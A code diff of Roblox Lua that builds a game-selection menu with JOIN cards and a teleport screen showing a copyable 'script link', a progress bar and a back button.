+	gameHeading.Parent = screen
+
+	--==================================================
+	-- DESCRIPTION
+	--==================================================
+
+	local info = Instance.new("TextLabel")
+	info.BackgroundTransparency = 1
+	info.Position = UDim2.fromOffset(25, 125)
+	info.Size = UDim2.new(1, -50, 0, 30)
+	info.Font = Enum.Font.Gotham
+	info.Text = "Your script link is ready."
+	info.TextSize = 14
+	info.TextColor3 = SUBTEXT
+	info.TextXAlignment = Enum.TextXAlignment.Center
+	info.ZIndex = 22
+	info.Parent = screen
+
+	--==================================================
+	-- LINK BOX
+	--==================================================
+
+	local linkBox = Instance.new("TextBox")
+	linkBox.Name = "ScriptLink"
+	linkBox.Position = UDim2.fromOffset(35, 170)
+	linkBox.Size = UDim2.new(1, -70, 0, 46)
+	linkBox.BackgroundColor3 = Color3.fromRGB(24, 24, 32)
+	linkBox.BorderSizePixel = 0
+	linkBox.Font = Enum.Font.Gotham
+	linkBox.Text = SCRIPT_LINK
+	linkBox.TextSize = 12
+	linkBox.TextColor3 = TEXT
+	linkBox.ClearTextOnFocus = false
+	linkBox.TextEditable = true
+	linkBox.Selectable = true
+	linkBox.TextXAlignment = Enum.TextXAlignment.Center
+	linkBox.ZIndex = 23
+	linkBox.Parent = screen
+
+	local linkCorner = Instance.new("UICorner")
+	linkCorner.CornerRadius = UDim.new(0, 10)
+	linkCorner.Parent = linkBox
+
+	local linkStroke = Instance.new("UIStroke")
+	linkStroke.Color = Color3.fromRGB(55, 55, 65)
+	linkStroke.Parent = linkBox
+
+	--==================================================
+	-- COPY MESSAGE
+	--==================================================
+
+	local copyText = Instance.new("TextLabel")
+	copyText.BackgroundTransparency = 1
+	copyText.Position = UDim2.fromOffset(25, 225)
+	copyText.Size = UDim2.new(1, -50, 0, 24)
+	copyText.Font = Enum.Font.Gotham
+	copyText.Text = "Click the link box, then press Ctrl + C to copy."
+	copyText.TextSize = 12
+	copyText.TextColor3 = SUBTEXT
+	copyText.TextXAlignment = Enum.TextXAlignment.Center
+	copyText.ZIndex = 22
+	copyText.Parent = screen
+
+	--==================================================
+	-- WARNING
+	--==================================================
+
+	local warning = Instance.new("TextLabel")
+	warning.BackgroundTransparency = 1
+	warning.Position = UDim2.fromOffset(30, 275)
+	warning.Size = UDim2.new(1, -60, 0, 55)
+	warning.Font = Enum.Font.Gotham
+	warning.TextWrapped = true
+	warning.Text = "If teleportation is unavailable, join the game manually\nand use the link above."
+	warning.TextSize = 13
+	warning.TextColor3 = Color3.fromRGB(190, 190, 200)
+	warning.TextXAlignment = Enum.TextXAlignment.Center
+	warning.ZIndex = 22
+	warning.Parent = screen
+
+	--==================================================
+	-- PROGRESS BACKGROUND
+	--==================================================
+
+	local progressBG = Instance.new("Frame")
+	progressBG.Position = UDim2.fromOffset(35, 350)
+	progressBG.Size = UDim2.new(1, -70, 0, 8)
+	progressBG.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+	progressBG.BorderSizePixel = 0
+	progressBG.ZIndex = 22
+	progressBG.Parent = screen
+
+	local progressBGCorner = Instance.new("UICorner")
+	progressBGCorner.CornerRadius = UDim.new(1, 0)
+	progressBGCorner.Parent = progressBG
+
+	--==================================================
+	-- PROGRESS
+	--==================================================
+
+	local progress = Instance.new("Frame")
+	progress.Size = UDim2.new(0, 0, 1, 0)
+	progress.BackgroundColor3 = gameData.Color
+	progress.BorderSizePixel = 0
+	progress.ZIndex = 23
+	progress.Parent = progressBG
+
+	local progressCorner = Instance.new("UICorner")
+	progressCorner.CornerRadius = UDim.new(1, 0)
+	progressCorner.Parent = progress
+
+	--==================================================
+	-- BACK BUTTON
+	--==================================================
+
+	local back = Instance.new("TextButton")
+	back.Name = "Back"
+	back.Position = UDim2.fromOffset(35, 400)
+	back.Size = UDim2.new(1, -70, 0, 45)
+	back.BackgroundColor3 = BUTTON
+	back.BorderSizePixel = 0
+	back.Text = "BACK TO GAMES"
+	back.Font = Enum.Font.GothamBold
+	back.TextSize = 12
+	back.TextColor3 = Color3.fromRGB(190, 190, 200)
+	back.AutoButtonColor = false
+	back.ZIndex = 23
+	back.Parent = screen
+
+	local backCorner = Instance.new("UICorner")
+	backCorner.CornerRadius = UDim.new(0, 10)
+	backCorner.Parent = back
+
+	back.MouseEnter:Connect(function()
+		back.BackgroundColor3 = Color3.fromRGB(32, 32, 42)
+	end)
+
+	back.MouseLeave:Connect(function()
+		back.BackgroundColor3 = BUTTON
+	end)
+
+	back.MouseButton1Click:Connect(function()
+
+		screen:Destroy()
+
+		scroll.Visible = true
+		title.Visible = true
+		subtitle.Visible = true
+		close.Visible = true
+		divider.Visible = true
+		dragArea.Visible = true
+
+	end)
+
+	--==================================================
+	-- PROGRESS ANIMATION
+	--==================================================
+
+	task.spawn(function()
+
+		for i = 0, 100 do
+
+			if not progress.Parent then
+				return
+			end
+
+			progress.Size = UDim2.new(i / 100, 0, 1, 0)
+
+			task.wait(0.02)
+
+		end
+
+	end)
+
+	--==================================================
+	-- TELEPORT
+	--==================================================
+
+	task.delay(0.8, function()
+
+		if screen.Parent and gameData.PlaceId > 0 then
+
+			pcall(function()
+				TeleportService:Teleport(gameData.PlaceId, player)
+			end)
+
+		end
+
+	end)
+
+end
+
+--==================================================
+-- GAME CARDS
+--==================================================
+
+for index, gameData in ipairs(GAMES) do
+
+	local card = Instance.new("Frame")
+	card.Name = gameData.Name
+	card.Size = UDim2.new(1, -3, 0, 74)
+	card.BackgroundColor3 = PANEL
+	card.BorderSizePixel = 0
+	card.LayoutOrder = index
+	card.Parent = scroll
+
+	local cardCorner = Instance.new("UICorner")
+	cardCorner.CornerRadius = UDim.new(0, 14)
+	cardCorner.Parent = card
+
+	local stroke = Instance.new("UIStroke")
+	stroke.Color = Color3.fromRGB(42, 42, 52)
+	stroke.Thickness = 1
+	stroke.Parent = card
+
+	--==================================================
+	-- COLOR BAR
+	--==================================================
+
+	local bar = Instance.new("Frame")
+	bar.Size = UDim2.fromOffset(6, 54)
+	bar.Position = UDim2.fromOffset(15, 10)
+	bar.BackgroundColor3 = gameData.Color
+	bar.BorderSizePixel = 0
+	bar.Parent = card
+
+	local barCorner = Instance.new("UICorner")
+	barCorner.CornerRadius = UDim.new(1, 0)
+	barCorner.Parent = bar
+
+	--==================================================
+	-- GAME NAME
+	--==================================================
+
+	local name = Instance.new("TextLabel")
+	name.BackgroundTransparency = 1
+	name.Position = UDim2.fromOffset(33, 9)
+	name.Size = UDim2.new(1, -180, 0, 28)
+	name.Font = Enum.Font.GothamBold
+	name.Text = gameData.Name
+	name.TextSize = 17
+	name.TextColor3 = TEXT
+	name.TextXAlignment = Enum.TextXAlignment.Left
+	name.Parent = card
+
+	--==================================================
+	-- DESCRIPTION
+	--==================================================
+
+	local description = Instance.new("TextLabel")
+	description.BackgroundTransparency = 1
+	description.Position = UDim2.fromOffset(34, 39)
+	description.Size = UDim2.new(1, -180, 0, 20)
+	description.Font = Enum.Font.Gotham
+	description.Text = gameData.Description
+	description.TextSize = 13
+	description.TextColor3 = SUBTEXT
+	description.TextXAlignment = Enum.TextXAlignment.Left
+	description.Parent = card
+
+	--==================================================
+	-- JOIN BUTTON
+	--==================================================
+
+	local join = Instance.new("TextButton")
+	join.Name = "Join"
+	join.Size = UDim2.fromOffset(128, 39)
+	join.Position = UDim2.new(1, -143, 0.5, -19)
+	join.BackgroundColor3 = BUTTON
+	join.BorderSizePixel = 0
+	join.Text = "JOIN"
+	join.Font = Enum.Font.GothamBold
+	join.TextSize = 13
+	join.TextColor3 = gameData.Color
+	join.AutoButtonColor = false
+	join.Parent = card
+
+	local joinCorner = Instance.new("UICorner")
+	joinCorner.CornerRadius = UDim.new(0, 10)
+	joinCorner.Parent = join
+
+	join.MouseEnter:Connect(function()
+		join.BackgroundColor3 = Color3.fromRGB(32, 32, 42)
+	end)
+
+	join.MouseLeave:Connect(function()
+		join.BackgroundColor3 = BUTTON
+	end)
+
+	join.MouseButton1Click:Connect(function()
+		showTeleportScreen(gameData)
+	end)
+
+end
